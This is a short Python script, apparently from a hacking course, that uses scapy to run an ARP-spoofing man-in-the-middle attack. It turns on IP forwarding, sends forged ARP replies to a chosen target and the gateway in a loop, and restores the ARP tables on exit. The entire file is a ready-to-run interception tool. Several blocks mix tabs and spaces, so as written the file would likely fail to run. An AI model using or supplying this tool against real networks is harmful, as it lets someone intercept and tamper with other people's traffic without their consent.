#!/usr/bin/env python3

import scapy.all as scapy
import subprocess
import time

def forward_packets():
    try:
        openfile = open('/proc/sys/net/ipv4/ip_forward', 'w')
        openfile.write('1')
        openfile.close()
        print("[+] IPv4 forwarding enabled")
    except:
        print("[-] Unable to set up IPv4 forwarding")
    
def forward_packets_restore():
    openfile = open('/proc/sys/net/ipv4/ip_forward', 'w')
    openfile.write('0')
    openfile.close()
    print("[-] IPv4 forwarding disabled")
	
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request #append arp_request to broadcast and store as new variable arp_request_broadcast
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def restore_arp(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
	packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
	scapy.send(packet, verbose=False)
    #if you don't specify source MAC(hwsrc), scapy will automatically send your MAC address
    #print(packet.show()) - show what is in the packet being sent
    #print(packet.summary())    
	
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
	
target_ip = input("Enter IP of target computer: ")
spoof_ip = input("Enter IP of computer to spoof (usually the gateway): ")
print("\nRunning ARP spoofer, press Ctrl + C to exit")
print("=============================================")

forward_packets()

sent_packets_count = 0
try:
    while True:
	    spoof(target_ip, spoof_ip)
		spoof(spoof_ip, target_ip)
		sent_packets_count += 2
		print("\r[+] Packets sent " + str(sent_packets_count), end="") #with python3 you use end=;
		#places output into a buffer
		#\r is a string literal - tells to always print statement from start of line, overwriting last
		time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Stopping ARP spoof, resetting ARP tables")
	restore_arp(target_ip, spoof_ip)
	restore_arp(spoof_ip, target_ip)
	forward_packets_restore()   
